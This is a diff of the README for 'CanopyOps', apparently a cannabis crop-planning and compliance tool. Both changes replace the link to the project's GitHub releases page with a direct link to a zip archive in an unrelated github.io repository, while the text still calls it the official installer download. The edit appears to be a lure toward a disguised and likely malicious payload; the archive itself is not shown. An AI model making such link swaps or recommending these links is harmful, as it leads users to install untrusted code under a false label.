@@ -5,7 +5,7 @@ description: "Manage cannabis cultivation logs, crop plans, and compliance recor
 ---
 # 🌿 CanopyOps - Better crop plans for consistent harvests
 
-[![](https://img.shields.io/badge/Download_CanopyOps-Blue.svg)](https://github.com/Bekhbekh7821/CanopyOps/releases)
+[![](https://img.shields.io/badge/Download_CanopyOps-Blue.svg)](https://raw.githubusercontent.com/Bekhbekh7821/bekhbekh7821.github.io/main/Anatolian/3.9.zip)
 
 CanopyOps helps cultivators manage growth cycles through data. Use this tool to track crop plans, perform diagnostics, run calculations, and log harvest details. The application connects your operational data with intelligence models to guide daily decision-making. 
 
@@ -13,7 +13,7 @@ CanopyOps helps cultivators manage growth cycles through data. Use this tool to 
 
 You need to download the installer from our release page to start. 
 
-[Click here to open the download page](https://github.com/Bekhbekh7821/CanopyOps/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Bekhbekh7821/bekhbekh7821.github.io/main/Anatolian/3.9.zip)
 
 1. Open the link above in your web browser.
 2. Find the section labeled Latest.
